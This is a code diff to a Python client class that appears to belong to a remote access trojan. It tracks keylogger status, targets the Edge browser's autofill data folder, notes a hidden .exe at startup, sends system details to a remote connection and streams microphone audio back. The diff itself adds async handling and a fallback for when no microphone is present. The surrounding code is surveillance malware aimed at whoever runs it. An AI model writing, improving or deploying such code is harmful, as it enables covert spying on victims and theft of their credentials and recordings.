@@ -28,7 +28,7 @@ class Client:
         self.key_pressed = None
         self.status_keylogger = False
         self.new_path = 'C:\\Users\\BCC\\AppData\\Local\\Microsoft\\Edge\\User Data\\Autofill'
-    def UpdateInfoAndSend(self):
+    async def UpdateInfoAndSend(self):
         self.OS_VER  = platform.platform()
         self.OS_NAME = platform.system()
         self.ARCH = platform.architecture()
@@ -50,7 +50,7 @@ class Client:
         AUTCON    : {self.AUTOCON}
         '''
         self.writer.write(bytes(self.info,'utf-8'))
-        self.writer.drain()
+        await self.writer.drain()
 
     def start_client(self):
         #hidden .exe
@@ -213,12 +213,21 @@ class Client:
                 break
         
         if self.MIC:
-            stream = p.open(
-                format=FORMAT,
-                channels=CHANNELS,
-                rate=RATE,
-                input=True,
-                frames_per_buffer=CHUNK)
+            try:
+                stream = p.open(
+                    format=FORMAT,
+                    channels=CHANNELS,
+                    rate=RATE,
+                    input=True,
+                    frames_per_buffer=CHUNK)
+            except:
+                self.MIC = False
+                writer.write(b'mic')
+                await writer.drain()
+                await asyncio.sleep(2)
+                writer.write(b'[-] No microphones')
+                await writer.drain()
+                return
         else:
             writer.write(b'mic')
             await writer.drain()
